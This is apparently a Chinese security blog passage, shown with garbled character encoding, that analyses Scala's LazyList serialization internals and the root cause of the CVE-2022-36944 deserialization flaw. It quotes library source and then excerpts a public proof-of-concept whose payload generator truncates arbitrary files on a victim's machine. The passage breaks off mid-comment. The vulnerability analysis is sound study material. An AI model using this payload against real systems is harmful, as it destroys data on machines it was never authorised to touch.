<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="meta">@tailrec</span></span><br><span class="line"><span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">foreach</span></span>[<span class="type">U</span>](f: <span class="type">A</span> =&gt; <span class="type">U</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line"> <span class="comment">// isEmptyæ˜¯ä¸€ä¸ªæ–¹æ³•ï¼Œscalaä¸­æ–¹æ³•æ— å‚æ•°å¯ä»¥çœç•¥()</span></span><br><span class="line">  <span class="keyword">if</span> (!isEmpty) &#123;</span><br><span class="line">    <span class="comment">// headä¹Ÿæ˜¯ä¸€ä¸ªæ–¹æ³•</span></span><br><span class="line">    f(head)</span><br><span class="line">    tail.foreach(f)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨<code>foreach</code>ä¸­ï¼Œé¦–å…ˆè°ƒç”¨<code>isEmpty</code>æ–¹æ³•åˆ¤æ–­å½“å‰<code>LazyList</code>å¯¹è±¡æ˜¯å¦ä¸ºç©ºï¼Œè‹¥ä¸ºç©ºåˆ™ç›´æ¥ç»“æŸï¼Œè‹¥ä¸ä¸ºç©ºåˆ™è®¡ç®—ç¬¬ä¸€ä¸ªå€¼<code>head</code>å¹¶è¿›è¡Œè¾“å‡ºï¼Œç„¶åå¯¹å‰©ä½™çš„å€¼<code>tail</code>é€’å½’è°ƒç”¨<code>foreach</code>æ–¹æ³•ç»§ç»­å¤„ç†ï¼Œä»è€Œå®ç°äº†æ— é™å–å€¼ã€‚<br><code>isEmpty</code>æ–¹æ³•é€šè¿‡æ¯”è¾ƒå½“å‰<code>state</code>æ˜¯å¦ä¸º <code>State.Empty</code>æ¥åˆ¤æ–­<code>LazyList</code>å¯¹è±¡æ˜¯å¦ä¸ºç©º  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">isEmpty</span></span>: <span class="type">Boolean</span> = state eq <span class="type">State</span>.<span class="type">Empty</span></span><br></pre></td></tr></table></figure>
<p>è€Œ<code>state</code>å˜é‡ä¹ƒ<code>LazyList</code>è¢«åˆ›å»ºæ—¶åœ¨ç±»ä¸»ä½“ä¸­è¢«å®šä¹‰ä¸”<code>lazy</code>ä¿®é¥°  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SerialVersionUID</span>(<span class="number">3</span>L)</span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">LazyList</span>[+<span class="type">A</span>] <span class="title">private</span>(<span class="params">private[this] var lazyState: (</span>) <span class="title">=&gt;</span> <span class="title">LazyList</span>.<span class="title">State</span>[<span class="type">A</span>])</span></span><br><span class="line">  <span class="keyword">extends</span> <span class="type">AbstractSeq</span>[<span class="type">A</span>]</span><br><span class="line">    <span class="keyword">with</span> <span class="type">LinearSeq</span>[<span class="type">A</span>]</span><br><span class="line">    <span class="keyword">with</span> <span class="type">LinearSeqOps</span>[<span class="type">A</span>, <span class="type">LazyList</span>, <span class="type">LazyList</span>[<span class="type">A</span>]]</span><br><span class="line">    <span class="keyword">with</span> <span class="type">IterableFactoryDefaults</span>[<span class="type">A</span>, <span class="type">LazyList</span>]</span><br><span class="line">    <span class="keyword">with</span> <span class="type">Serializable</span> &#123;</span><br><span class="line">  <span class="keyword">import</span> <span class="type">LazyList</span>._</span><br><span class="line"></span><br><span class="line">  <span class="meta">@volatile</span> <span class="keyword">private</span>[<span class="keyword">this</span>] <span class="keyword">var</span> stateEvaluated: <span class="type">Boolean</span> = <span class="literal">false</span></span><br><span class="line">  <span class="meta">@inline</span> <span class="keyword">private</span> <span class="function"><span class="keyword">def</span> <span class="title">stateDefined</span></span>: <span class="type">Boolean</span> = stateEvaluated</span><br><span class="line">  <span class="keyword">private</span>[<span class="keyword">this</span>] <span class="keyword">var</span> midEvaluation = <span class="literal">false</span></span><br><span class="line">   <span class="comment">// lazyå…³é”®å­—ä¿®é¥°ï¼Œæ‡’åŠ è½½ï¼Œç¬¬ä¸€æ¬¡è¢«ä½¿ç”¨æ—¶æ‰è¿›è¡Œæ±‚å€¼</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">lazy</span> <span class="keyword">val</span> state: <span class="type">State</span>[<span class="type">A</span>] = &#123;</span><br><span class="line">    <span class="comment">// if it&#x27;s already mid-evaluation, we&#x27;re stuck in an infinite</span></span><br><span class="line">    <span class="comment">// self-referential loop (also it&#x27;s empty)</span></span><br><span class="line">    <span class="keyword">if</span> (midEvaluation) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="type">RuntimeException</span>(<span class="string">&quot;self-referential LazyList or a derivation thereof has no more elements&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ä¸­é—´æ±‚å€¼æ ‡å¿—</span></span><br><span class="line">    midEvaluation = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">val</span> res = <span class="keyword">try</span> lazyState() <span class="keyword">finally</span> midEvaluation = <span class="literal">false</span></span><br><span class="line">    <span class="comment">// if we set it to `true` before evaluating, we may infinite loop</span></span><br><span class="line">    <span class="comment">// if something expects `state` to already be evaluated</span></span><br><span class="line">    <span class="comment">// æ˜¯å¦å·²ç»è¢«æ±‚å€¼</span></span><br><span class="line">    stateEvaluated = <span class="literal">true</span></span><br><span class="line">    lazyState = <span class="literal">null</span> <span class="comment">// allow GC</span></span><br><span class="line">    res</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>å…¶å®é™…ä¸Šæ˜¯è°ƒç”¨äº†<code>lazyState</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•æ¥è‡ªæ„é€ å‡½æ•°çš„å‚æ•°<code>lazyState: () =&gt; LazyList.State[A]</code>ï¼Œå‰é¢åœ¨åˆ›å»º<code>LazyList</code>è°ƒç”¨<code>newLL</code>æ–¹æ³•æ—¶ä¼ å…¥çš„<code>sCons</code>æ–¹æ³•è¿”å›å¯¹è±¡å³<code>state</code>çš„å€¼ï¼Œå³ä¸€ä¸ª<code>Cons</code>ï¼ˆ<code>State</code>çš„å­ç±»ï¼‰å¯¹è±¡ï¼Œå½“è¯¥<code>State</code>å¯¹è±¡ä¸ä¸ºç©º(<code>Empty</code>)æ—¶ï¼Œä¾¿å¯ä¸€ç›´å–å€¼ã€‚<br>è‹¥è¦å®ç°å›ºå®šæ•°é‡å–å€¼ï¼Œå¯ä½¿ç”¨<code>take</code>æ–¹æ³•  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">ll.take(<span class="number">10</span>).foreach(println)</span><br></pre></td></tr></table></figure>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">take</span></span>(n: <span class="type">Int</span>): <span class="type">LazyList</span>[<span class="type">A</span>] =</span><br><span class="line">  <span class="keyword">if</span> (knownIsEmpty) <span class="type">LazyList</span>.empty</span><br><span class="line">  <span class="keyword">else</span> (takeImpl(n): <span class="meta">@inline</span>)</span><br></pre></td></tr></table></figure>
<p>åœ¨<code>take</code>æ–¹æ³•ä¸­é¦–å…ˆè°ƒç”¨<code>knownIsEmpty</code>æ–¹æ³•åˆ¤æ–­å½“å‰<code>LazyList</code>æ˜¯å¦ä¸ºç©ºï¼Œè‹¥ä¸ºç©ºåˆ™å“åº”ä¸€ä¸ª<code>Empty</code>å¯¹è±¡ï¼Œä¸ä¸ºç©ºåˆ™è°ƒç”¨<code>takeImpl</code>æ–¹æ³•<br>åœ¨<code>takeImpl</code>æ–¹æ³•ä¸­ï¼Œé¦–å…ˆåˆ¤æ–­<code>n</code>çš„å¤§å°ï¼Œå¦‚æœå°äº<code>0</code>åˆ™å“åº”ä¸€ä¸ª<code>Empty</code>å¯¹è±¡ï¼Œè¯¥æ¡ä»¶æ˜¯<code>takeImpl</code>é€’å½’çš„åŸºä¾‹ã€‚å¦‚æœä¸ä¸º<code>0</code>åˆ™ç»§ç»­å°è¯•è°ƒç”¨<code>isEmpty</code>æ–¹æ³•åˆ¤æ–­æ ¹<code>LazyList</code>å¯¹è±¡æ˜¯å¦è¢«å–ç©ºï¼Œè‹¥è¢«å–ç©ºåˆ™å“åº”ä¸€ä¸ª<code>Empty</code>å¯¹è±¡å¹¶ç»“æŸé€’å½’ï¼Œè‹¥æœªè¢«å–ç©ºåˆ™åˆ›å»ºä¸€ä¸ª<code>sCons</code>å¯¹è±¡ï¼Œè¯¥å¯¹è±¡çš„ç¬¬äºŒä¸ªå‚æ•°é€’å½’è°ƒç”¨<code>takeImpl</code>æ–¹æ³•ï¼Œå…¶å‚æ•°å€¼éšç€é€’å½’æ·±åº¦å¢åŠ é€æ­¥å‡<code>1</code>ç›´åˆ°æœ€ç»ˆä¸º<code>0</code>æ—¶å“åº”ä¸€ä¸ª<code>Empty</code>å¯¹è±¡ï¼Œæ­¤æ—¶åœ¨è°ƒç”¨<code>foreach</code>æ–¹æ³•è¿›è¡Œå€¼è¾“å‡ºæ—¶è¿›è¡Œ<code>isEmpty</code>åˆ¤æ–­å°†ä¼šè¿”å›<code>true</code>ï¼Œä»è€Œå®ç°äº†å›ºå®šæ•°é‡å–å€¼ã€‚  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">def</span> <span class="title">takeImpl</span></span>(n: <span class="type">Int</span>): <span class="type">LazyList</span>[<span class="type">A</span>] = &#123;</span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>) <span class="type">LazyList</span>.empty</span><br><span class="line">  <span class="keyword">else</span> newLL &#123;</span><br><span class="line">    <span class="keyword">if</span> (isEmpty) <span class="type">State</span>.<span class="type">Empty</span></span><br><span class="line">    <span class="keyword">else</span> sCons(head, tail.takeImpl(n - <span class="number">1</span>))</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨<code>take</code>æ–¹æ³•ä¸­<code>knownIsEmpty</code>ä¼šé¦–å…ˆåˆ¤æ–­å½“å‰<code>stateEvaluated</code>ï¼ˆè¡¨ç¤ºæ˜¯å¦å·²ç»å–è¿‡å€¼ï¼Œè‹¥æ²¡æœ‰å–è¿‡å€¼åˆ™è¯¥å˜é‡ä¸ºfalseï¼‰æ˜¯å¦ä¸º<code>true</code>ï¼Œè‹¥è¯¥å€¼ä¸º<code>false</code>åˆ™è¡¨ç¤ºè¿˜æ²¡æœ‰å¼€å§‹å–å€¼ï¼Œå¯ä»¥æ”¾å¿ƒå¾—ç»§ç»­å–å€¼ï¼Œè‹¥è¯¥å€¼ä¸º<code>true</code>ï¼Œåˆ™è¿˜éœ€åˆ¤æ–­<code>tail</code>æ˜¯å¦ä¸º<code>Empty</code>ï¼Œå³å€¼æ˜¯å¦å·²ç»è¢«å–ç©ºäº†ã€‚  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="meta">@inline</span> <span class="keyword">private</span>[<span class="keyword">this</span>] <span class="function"><span class="keyword">def</span> <span class="title">knownIsEmpty</span></span>: <span class="type">Boolean</span> = stateEvaluated &amp;&amp; (isEmpty: <span class="meta">@inline</span>)</span><br></pre></td></tr></table></figure>
<h4 id="LazyListåºåˆ—åŒ–ä¸ååºåˆ—åŒ–"><a href="#LazyListåºåˆ—åŒ–ä¸ååºåˆ—åŒ–" class="headerlink" title="LazyListåºåˆ—åŒ–ä¸ååºåˆ—åŒ–"></a>LazyListåºåˆ—åŒ–ä¸ååºåˆ—åŒ–</h4><p><code>LazyList</code>å¹¶æ²¡æœ‰å®ç°<code>readObject/writeObject/readExternalObject/writeExternalObject</code>æ–¹æ³•ï¼Œå´å®ç°äº†<code>writeReplace</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•åœ¨åºåˆ—åŒ–å¯¹è±¡æ—¶å°†æ›¿æ¢æ­£åœ¨è¢«åºåˆ—åŒ–çš„<code>LazyList</code>å¯¹è±¡ï¼Œååºåˆ—åŒ–æ—¶è‹¥æ›¿æ¢çš„å¯¹è±¡ä¸­å­˜åœ¨<code>readResolve</code>æ–¹æ³•å°†ä½¿ç”¨è¯¥æ–¹æ³•è¿˜åŸ<code>LazyList</code>å¯¹è±¡<br><code>LazyList</code>çš„<code>writeReplace</code>æ–¹æ³•å¦‚ä¸‹ï¼š  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span>[<span class="keyword">this</span>] <span class="function"><span class="keyword">def</span> <span class="title">writeReplace</span></span>(): <span class="type">AnyRef</span> =</span><br><span class="line">  <span class="keyword">if</span> (knownNonEmpty) <span class="keyword">new</span> <span class="type">LazyList</span>.<span class="type">SerializationProxy</span>[<span class="type">A</span>](<span class="keyword">this</span>) <span class="keyword">else</span> <span class="keyword">this</span></span><br></pre></td></tr></table></figure>
<p>å½“å·²ç»è¢«æ±‚å€¼ä¸”ä»æœ‰å€¼æœªè¢«å–èµ°ï¼Œå°†è°ƒç”¨<code>SerializationProxy</code>çš„åºåˆ—åŒ–ä»¥åŠååºåˆ—åŒ–æ–¹æ³•</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"> <span class="meta">@SerialVersionUID</span>(<span class="number">3</span>L)</span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializationProxy</span>[<span class="type">A</span>](<span class="params">@transient protected var coll: <span class="type">LazyList</span>[<span class="type">A</span>]</span>) <span class="keyword">extends</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span>[<span class="keyword">this</span>] <span class="function"><span class="keyword">def</span> <span class="title">writeObject</span></span>(out: <span class="type">ObjectOutputStream</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">    out.defaultWriteObject()</span><br><span class="line">    <span class="keyword">var</span> these = coll</span><br><span class="line">    <span class="keyword">while</span>(these.knownNonEmpty) &#123;</span><br><span class="line">      out.writeObject(these.head)</span><br><span class="line">      these = these.tail</span><br><span class="line">    &#125;</span><br><span class="line">    out.writeObject(<span class="type">SerializeEnd</span>)</span><br><span class="line">    out.writeObject(these)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span>[<span class="keyword">this</span>] <span class="function"><span class="keyword">def</span> <span class="title">readObject</span></span>(in: <span class="type">ObjectInputStream</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">    in.defaultReadObject()</span><br><span class="line">    <span class="keyword">val</span> init = <span class="keyword">new</span> <span class="type">ArrayBuffer</span>[<span class="type">A</span>]</span><br><span class="line">    <span class="keyword">var</span> initRead = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">while</span> (!initRead) in.readObject <span class="keyword">match</span> &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="type">SerializeEnd</span> =&gt; initRead = <span class="literal">true</span></span><br><span class="line">      <span class="keyword">case</span> a =&gt; init += a.asInstanceOf[<span class="type">A</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">val</span> tail = in.readObject().asInstanceOf[<span class="type">LazyList</span>[<span class="type">A</span>]]</span><br><span class="line">    coll = init ++: tail</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span>[<span class="keyword">this</span>] <span class="function"><span class="keyword">def</span> <span class="title">readResolve</span></span>(): <span class="type">Any</span> = coll</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨è¿›è¡Œåºåˆ—åŒ–æ—¶å°†è°ƒç”¨<code>writeObject</code>æ–¹æ³•ã€‚<br>é¦–å…ˆå°†ä¼šè°ƒç”¨è¾“å‡ºæµå¯¹è±¡çš„<code>defaultWriteObject</code>æ–¹æ³•ï¼Œç„¶åè°ƒç”¨<code>LazyList</code>å¯¹è±¡<code>these</code>çš„<code>knownNonEmpty</code>æ–¹æ³•åˆ¤æ–­æ˜¯å¦å·²ç»è¢«æ±‚å€¼ä¸”ä»æœ‰å€¼æœªè¢«å–èµ°åˆ™é¦–å…ˆå°†è¢«å–å‡ºçš„å€¼è¿›è¡Œå¸¸è§„çš„åºåˆ—åŒ–ï¼Œç„¶åå°†å‰©ä½™å€¼çš„è®¡ç®—æ–¹æ³•ï¼ˆ<code>tail</code>ï¼‰èµ‹å€¼ç»™<code>these</code>å˜é‡ã€‚å½“æ‰€æœ‰çš„è¢«è®¡ç®—è¿‡çš„å€¼éƒ½è¢«å–å‡ºååˆ™é€€å‡ºå¾ªç¯ï¼Œç„¶åæ’å…¥ä¸€ä¸ªåºåˆ—åŒ–ç»ˆæ­¢æ ‡å¿—ï¼Œæœ€åå†å°†<code>these</code>è¿›è¡Œåºåˆ—åŒ–ã€‚æ’å…¥åºåˆ—åŒ–ç»ˆæ­¢æ ‡å¿—æ˜¯ä¸ºäº†åˆ†å‰²ä¸¤ç§ä¸åŒçš„åºåˆ—åŒ–å¯¹è±¡ï¼Œç»ˆæ­¢æ ‡å¿—å‰çš„éƒ¨åˆ†ä¸ºè¢«è®¡ç®—è¿‡çš„å€¼ï¼Œè€Œåé¢çš„éƒ¨åˆ†ä¸ºå‰©ä½™å€¼çš„è®¡ç®—æ–¹æ³•ï¼ˆ<code>tail</code>ï¼‰ã€‚<br>åœ¨è¿›è¡Œååºåˆ—åŒ–æ—¶å°†å…ˆè°ƒç”¨<code>readObject</code>æ–¹æ³•ï¼Œå†è°ƒç”¨<code>readResolve</code>æ–¹æ³•ã€‚<br><code>readObject</code>æ–¹æ³•ä¸­ï¼Œé¦–å…ˆè°ƒç”¨è¾“å…¥æµå¯¹è±¡çš„<code>defaultReadObject</code>æ–¹æ³•ï¼Œç„¶ååˆ›å»ºç¼“å†²åˆ—è¡¨<code>init</code>ç”¨ä»¥å­˜å‚¨è¢«ååºåˆ—åŒ–çš„è®¡ç®—å€¼ï¼Œæ ‡å¿—<code>initRead</code>ç”¨ä»¥åˆ¤æ–­è®¡ç®—å€¼æ˜¯å¦è¢«è¯»å–å®Œæ¯•ï¼Œè‹¥è¯»å–å®Œæ¯•åˆ™ååºåˆ—åŒ–å‰©ä½™å€¼çš„è®¡ç®—æ–¹æ³•å¹¶èµ‹å€¼ç»™<code>tail</code>å˜é‡ï¼Œç„¶åè°ƒç”¨<code>init</code>çš„<code>++:</code>æ–¹æ³•ï¼Œå¯¹å·²è®¡ç®—å€¼ä¸è®¡ç®—æ–¹æ³•è¿›è¡Œè¿æ¥ã€‚  </p>
<h3 id="LazyListååºåˆ—åŒ–æ¼æ´æˆå› "><a href="#LazyListååºåˆ—åŒ–æ¼æ´æˆå› " class="headerlink" title="LazyListååºåˆ—åŒ–æ¼æ´æˆå› "></a>LazyListååºåˆ—åŒ–æ¼æ´æˆå› </h3><p>åœ¨è°ƒç”¨<code>++:</code>æ–¹æ³•æ—¶æ¼æ´äº§ç”Ÿäº†  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">@`inline` <span class="keyword">override</span> <span class="keyword">final</span> <span class="function"><span class="keyword">def</span> <span class="title">++</span></span>: [<span class="type">B</span> &gt;: <span class="type">A</span>](prefix: <span class="type">IterableOnce</span>[<span class="type">B</span>]): <span class="type">CC</span>[<span class="type">B</span>] = prependedAll(prefix)</span><br></pre></td></tr></table></figure>
<p><code>prependedAll</code>æ–¹æ³•åœ¨<code>LazyList</code>ä¸­è¢«é‡å†™  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">prependedAll</span></span>[<span class="type">B</span> &gt;: <span class="type">A</span>](prefix: collection.<span class="type">IterableOnce</span>[<span class="type">B</span>]): <span class="type">LazyList</span>[<span class="type">B</span>] =</span><br><span class="line">  <span class="keyword">if</span> (knownIsEmpty) <span class="type">LazyList</span>.from(prefix)</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (prefix.knownSize == <span class="number">0</span>) <span class="keyword">this</span></span><br><span class="line">  <span class="keyword">else</span> newLL(stateFromIteratorConcatSuffix(prefix.iterator)(state))</span><br></pre></td></tr></table></figure>
<p><code>knownIsEmpty</code>æ–¹æ³•ç”¨äºåˆ¤æ–­è®¡ç®—æ–¹æ³•ä¸­æ˜¯å¦ä»æœ‰å€¼æœªè¢«è®¡ç®—  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="comment">// stateEvaluated éœ€è¦ä¸ºtrueï¼Œå³æœ‰å€¼è¢«è®¡ç®—è¿‡  </span></span><br><span class="line">  <span class="meta">@inline</span> <span class="keyword">private</span>[<span class="keyword">this</span>] <span class="function"><span class="keyword">def</span> <span class="title">knownIsEmpty</span></span>: <span class="type">Boolean</span> = stateEvaluated &amp;&amp; (isEmpty: <span class="meta">@inline</span>)</span><br></pre></td></tr></table></figure>
<p><code>isEmpty</code>æ–¹æ³•åˆ¤æ–­æ˜¯å¦æœ‰å€¼ä»æœªè¢«è®¡ç®—  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">isEmpty</span></span>: <span class="type">Boolean</span> = state eq <span class="type">State</span>.<span class="type">Empty</span></span><br></pre></td></tr></table></figure>
<p>å‰é¢å·²ç»æåˆ°è¿‡<code>state</code>æ¥è‡ª<code>lazyState</code>æ–¹æ³•çš„è®¡ç®—ç»“æœï¼Œè€Œ<code>lazyState</code>æ¥è‡ªäºå®ä¾‹åŒ–<code>LazyList</code>å¯¹è±¡æ—¶ä¼ çš„ä¸€ä¸ªæ— å‚åŒ¿åå‡½æ•°ã€‚  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SerialVersionUID</span>(<span class="number">3</span>L)</span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">LazyList</span>[+<span class="type">A</span>] <span class="title">private</span>(<span class="params">private[this] var lazyState: (</span>) <span class="title">=&gt;</span> <span class="title">LazyList</span>.<span class="title">State</span>[<span class="type">A</span>])</span></span><br><span class="line">  <span class="keyword">extends</span> <span class="type">AbstractSeq</span>[<span class="type">A</span>]</span><br><span class="line">    <span class="keyword">with</span> <span class="type">LinearSeq</span>[<span class="type">A</span>]</span><br><span class="line">    <span class="keyword">with</span> <span class="type">LinearSeqOps</span>[<span class="type">A</span>, <span class="type">LazyList</span>, <span class="type">LazyList</span>[<span class="type">A</span>]]</span><br><span class="line">    <span class="keyword">with</span> <span class="type">IterableFactoryDefaults</span>[<span class="type">A</span>, <span class="type">LazyList</span>]</span><br><span class="line">    <span class="keyword">with</span> <span class="type">Serializable</span> &#123;</span><br><span class="line">  <span class="keyword">import</span> <span class="type">LazyList</span>._</span><br><span class="line"></span><br><span class="line">  <span class="meta">@volatile</span> <span class="keyword">private</span>[<span class="keyword">this</span>] <span class="keyword">var</span> stateEvaluated: <span class="type">Boolean</span> = <span class="literal">false</span></span><br><span class="line">  <span class="meta">@inline</span> <span class="keyword">private</span> <span class="function"><span class="keyword">def</span> <span class="title">stateDefined</span></span>: <span class="type">Boolean</span> = stateEvaluated</span><br><span class="line">  <span class="keyword">private</span>[<span class="keyword">this</span>] <span class="keyword">var</span> midEvaluation = <span class="literal">false</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">lazy</span> <span class="keyword">val</span> state: <span class="type">State</span>[<span class="type">A</span>] = &#123;</span><br><span class="line">    <span class="comment">// if it&#x27;s already mid-evaluation, we&#x27;re stuck in an infinite</span></span><br><span class="line">    <span class="comment">// self-referential loop (also it&#x27;s empty)</span></span><br><span class="line">    <span class="keyword">if</span> (midEvaluation) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="type">RuntimeException</span>(<span class="string">&quot;self-referential LazyList or a derivation thereof has no more elements&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    midEvaluation = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">val</span> res = <span class="keyword">try</span> lazyState() <span class="keyword">finally</span> midEvaluation = <span class="literal">false</span></span><br><span class="line">    <span class="comment">// if we set it to `true` before evaluating, we may infinite loop</span></span><br><span class="line">    <span class="comment">// if something expects `state` to already be evaluated</span></span><br><span class="line">    stateEvaluated = <span class="literal">true</span></span><br><span class="line">    lazyState = <span class="literal">null</span> <span class="comment">// allow GC</span></span><br><span class="line">    res</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é‚£ä¹ˆï¼Œå¦‚æœåœ¨åˆ›å»º<code>LazyList</code>å¯¹è±¡æ—¶ç»™å…¶ä¼ ä»»æ„ä¸€ä¸ªæ— å‚åŒ¿åå‡½æ•°ï¼Œå²‚ä¸æ˜¯å¯å·²å®ç°ä»»æ„æ— å‚åŒ¿åå‡½æ•°è°ƒç”¨ã€‚  </p>
<h3 id="LazyListååºåˆ—åŒ–æ¼æ´åˆ©ç”¨"><a href="#LazyListååºåˆ—åŒ–æ¼æ´åˆ©ç”¨" class="headerlink" title="LazyListååºåˆ—åŒ–æ¼æ´åˆ©ç”¨"></a>LazyListååºåˆ—åŒ–æ¼æ´åˆ©ç”¨</h3><p>åœ¨çŸ¥é“äº†æ¼æ´çš„æˆå› åï¼Œå¦‚ä½•å¯»æ‰¾å¯åˆ©ç”¨çš„åŒ¿åå‡½æ•°æ˜¯ä¸ªéš¾ç‚¹ã€‚githubä¸­æµä¼ ç€è¯¥æ¼æ´çš„POCã€‚<a href="https://github.com/yarocher/lazylist-cve-poc/tree/main#/">CVE-2022-36944 POC</a><br>å¯¹è¯¥<code>POC</code>ä»£ç è¿›è¡Œåˆ†æï¼Œå…¥å£ç‚¹ä¸º  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> poc.cve.lazylist.payload;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> poc.cve.lazylist.function0.DefaultProviders;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">   <span class="comment">// è¿™æ˜¯ä¸€ä¸ªè¿›è¡Œä»»æ„æ–‡ä»¶æ“¦é™¤çš„ä¾‹å­</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">      <span class="comment">// è¦è¢«æ“¦é™¤çš„æ–‡ä»¶è·¯å¾„</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">fileToTruncate</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">// æ˜¯å¦è¿›è¡Œè¿½åŠ </span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">append</span> <span class="operator">=</span> Boolean.parseBoolean(args[<span class="number">1</span>]);</span><br><span class="line">      <span class="comment">// åˆ›å»ºPayloadç”Ÿæˆå™¨å¯¹è±¡</span></span><br><span class="line">        <span class="type">PayloadGenerator</span> <span class="variable">payloadGenerator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LazyList</span>(DefaultProviders.FILE_OUTPUT);</span><br><span class="line">        <span class="comment">// ç”ŸæˆPayload</span></span><br><span class="line">        <span class="type">byte</span>[] payload = payloadGenerator.generatePayload(fileToTruncate, append);</span><br><span class="line"></span><br><span class="line">        System.out.write(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨åˆ›å»º<code>payloadGenerator</code>å¯¹è±¡æ—¶ä½¿ç”¨çš„<code>DefaultProviders.FILE_OUTPUT</code>æ˜¯ä¸€ä¸ª<code>Function</code>å¯¹è±¡  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Function&lt;Object[], Function0&lt;Object&gt;&gt; FILE_OUTPUT = DefaultProviders::fileOutput;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * When invoked, instantiates new FileOutputStream(String fileName, boolean append) with controlled parameters is</span></span><br><span class="line"><span class="comment">     * called. If append is false, right after creating, specified file is truncated (written with 0). Which means you can</span></span><br><span class="line"><span class="comment">     * truncate any file on victim&#x27;s machine which victim has write access to.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args args[0]: String, file name to truncate; args[1]: boolean, whether to append or overwrite.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Function0 instance which can overwrite any file with zero when Object apply() is invoked</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Function0&lt;Object&gt; <span class="title function_">fileOutput</span><span class="params">(Object[] args)</span> &#123;</span><br><span class="line">      <span class="comment">// æ–‡ä»¶è·¯å¾„</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">fileToTruncate</span> <span class="operator">=</span> (String) args[<span class="number">0</span>];</span><br><span class="line">      <span class="comment">// æ˜¯å¦è¿½åŠ </span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">append</span> <span class="operator">=</span> (Boolean) args[<span class="number">1</span>];</span><br><span class="line">        <span class="comment">// é€šè¿‡åå°„çš„æ–¹å¼è·å¾—scala.sys.process.ProcessBuilderImpl$FileOutput$$anonfun$$lessinit$greater$3 ç±»çš„å®ä¾‹</span></span><br><span class="line">        <span class="comment">// 